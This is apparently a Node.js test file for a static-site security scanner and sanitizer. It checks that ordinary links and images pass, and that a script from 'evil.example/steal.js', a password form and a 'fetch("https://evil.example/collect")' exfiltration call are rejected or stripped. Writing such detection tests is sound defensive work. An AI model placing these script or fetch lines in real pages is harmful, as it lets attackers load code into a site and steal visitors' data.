const test = require('node:test');
const assert = require('node:assert/strict');
const {
  scanStaticFile,
  sanitizeSafeStaticHtml,
} = require('../src/services/staticSiteSecurity');

function textFile(name, extension, content) {
  return {
    originalName: name,
    relativePath: name,
    extension,
    buffer: Buffer.from(content, 'utf8'),
  };
}

test('static review accepts ordinary links, HTTPS images, and SVG namespace metadata', () => {
  const html = `<!doctype html>
    <a href="https://example.com/work">Portfolio</a>
    <img src="https://images.example.com/photo.webp" alt="Portrait">
    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg'%3E%3C/svg%3E">`;

  assert.equal(scanStaticFile(textFile('index.html', '.html', html)), null);

  const sanitized = sanitizeSafeStaticHtml(html);
  assert.match(sanitized, /href="https:\/\/example\.com\/work"/);
  assert.match(sanitized, /src="https:\/\/images\.example\.com\/photo\.webp"/);
  assert.match(sanitized, /http:\/\/www\.w3\.org\/2000\/svg/);
});

test('static review still rejects active external content and data collection', () => {
  assert.throws(
    () => {
      const finding = scanStaticFile(textFile('index.html', '.html', '<script src="https://evil.example/steal.js"></script>'));
      if (finding) throw new Error(finding);
    }, /external script/,
  );

  assert.throws(
    () => {
      const finding = scanStaticFile(textFile('index.html', '.html', '<form><input type="password"></form>'));
      if (finding) throw new Error(finding);
    }, /password collection|forms are not allowed/,
  );

  assert.throws(
    () => {
      const finding = scanStaticFile(textFile('app.js', '.js', 'fetch("https://evil.example/collect")'));
      if (finding) throw new Error(finding);
    }, /network exfiltration/,
  );
});

test('safe static sanitizer removes remote executable resources but keeps navigation', () => {
  const html = '<a href="https://example.com">Visit</a>'
    + '<script src="https://evil.example/app.js"></script>'
    + '<link rel="stylesheet" href="https://evil.example/app.css">';
  const sanitized = sanitizeSafeStaticHtml(html);

  assert.match(sanitized, /href="https:\/\/example\.com"/);
  assert.doesNotMatch(sanitized, /evil\.example/);
});
